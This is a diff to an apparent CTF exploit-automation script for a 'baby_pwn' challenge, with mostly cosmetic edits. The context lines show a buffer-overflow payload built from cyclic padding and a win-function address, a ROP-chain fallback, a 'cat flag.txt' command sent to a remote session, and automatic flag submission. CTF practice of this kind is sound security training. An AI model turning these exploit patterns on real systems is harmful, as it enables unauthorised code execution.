@@ -2,7 +2,7 @@
 # Automates solving a typical CTF pwn challenge
 
 print("[*] CTF Challenge Solver")
-print("============================================================")
+print("=" * 60)
 
 let challenge_name = "baby_pwn"
 let remote_host = "ctf.challenge.com"
@@ -65,7 +65,7 @@ let elf = parse_elf("./baby_pwn")
 if "win" in elf.symbols
     print("    [+] Found win function @ " + hex(elf.symbols.win))
     let win_addr = elf.symbols.win
-    let payload = cyclic(offset) + p64(win_addr)
+    let payload = cyclic(offset) + pack64(win_addr)
 else
     print("    [*] No win function, building ROP chain...")
     let rop = rop_chain("./baby_pwn")
@@ -103,7 +103,7 @@ send(remote_session, "cat flag.txt\n")
 let flag = recv(remote_session, 1024)
 print("\n" + "=" * 60)
 print("FLAG: " + flag)
-print("============================================================")
+print("=" * 60)
 
 # Submit flag automatically
 if env("CTF_TOKEN")
